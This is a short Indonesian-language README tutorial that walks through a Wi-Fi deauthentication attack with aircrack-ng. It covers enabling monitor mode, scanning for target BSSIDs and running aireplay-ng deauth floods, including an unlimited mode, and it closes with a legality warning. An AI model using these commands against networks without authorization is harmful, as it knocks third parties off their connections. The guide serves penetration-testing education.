![English](README.md) / Bahasa
# Deauthentication Attack dengan `aircrack-ng` di Linux

Berikut panduan dasar untuk melakukan serangan deauth menggunakan `aircrack-ng` pada sistem berbasis Ubuntu/Debian (mungkin identik pada sistem lain):

---

## Prasyarat

- Kartu Jaringan yang support mode monitor dan packet injection (contoh: Atheros AR9565)
- `aircrack-ng` terpasang, jika belum:
  
  ```bash
  sudo apt install aircrack-ng
  ```

## Langkah-langkah

1. **Buka Terminal**: Tekan `Ctrl + Alt + T` untuk membuka terminal.

2. **Periksa Antarmuka Jaringan**: Cek nama antarmuka jaringanmu (contoh: wlan0, wlp3s0), gunakan perintah:
   
    ```bash
    iwconfig
    ```

3. **Masukkan Antarmuka jaringan ke mode monitor**: Pakai `airmon-ng`. Ganti `wlan0` dengan nama antarmuka jaringanmu:
   
    ```bash
    sudo airmon-ng start wlan0
    ```
    Mungkin airmon-ng akan mengganti nama antarmukamu (contoh: `wlan0mon`, `wlp3s0mon`).

4. **Cek Ulang Nama Antarmuka Jaringan**: Gunakan kembali `iwconfig`:

   ```bash
   iwconfig
   ```
   Cek apakah nama antarmuka berubah (contoh: `wlan0mon` `wlp3s0mon`).

5. **Pindai Jaringan**: Gunakan `airodump-ng` untuk memindai jaringan sekitar dan catat channel dan BSSID (alamat MAC) target:

   ```bash
   sudo airodump-ng wlan0mon
   ```
   Ini akan memindai jaringan di semua channel. Tekan `Ctrl+C` untuk berhenti.

6. **Pindai Jaringan Target**: Setelah channel target diketahui, pakai `--channel` dan pindai ulang.
   
   ```bash
   sudo airodump-ng wlan0mon --channel 1
   ```
   Ganti `1` dengan channel targetmu.

7. **Jalankan Serangan Deauthentication**: Buka terminal baru dan lakukan serangan dengan:

   ```bash
   sudo aireplay-ng -0 5 -a <BSSID> wlan0mon
   ```
   Ganti `<BSSID>` dengan BSSID target.

   `-0` diperlukan untuk deauthentication.\
   `5` adalah jumlah berapa kali paket deauth dikirimkan. Atur sesuai kebutuhan. `0` berarti tanpa batas.

8. **Pantau Aktiviats**: Kembali ke layar `airodump-ng`. perangkat yang terputus dan mencoba menyambung ulang harusnya terlihat.

9. **Matikan Mode Monitor**: Setelah selesai, matikan mode monitor dengan:

   ```bash
   sudo airmon-ng stop wlan0mon
   ```
   Ganti `wlan0mon` dengan nama antarmuka jaringanmu jika berbeda.

## Catatan!!
- **Peringatan**: Serangan deauthentication dapat menjadi ilegal jika dilakukan tanpa otorisas yang tepat. Pastikan Anda memiliki izin sebelum melakukan pengujian tersebut.
- Gunakan secara bijak dan di lingkungan terkontrol.
- Perhatikan hukum dan peraturan yang terkait dengan keamanan jaringan nirkabel di wilayah Anda
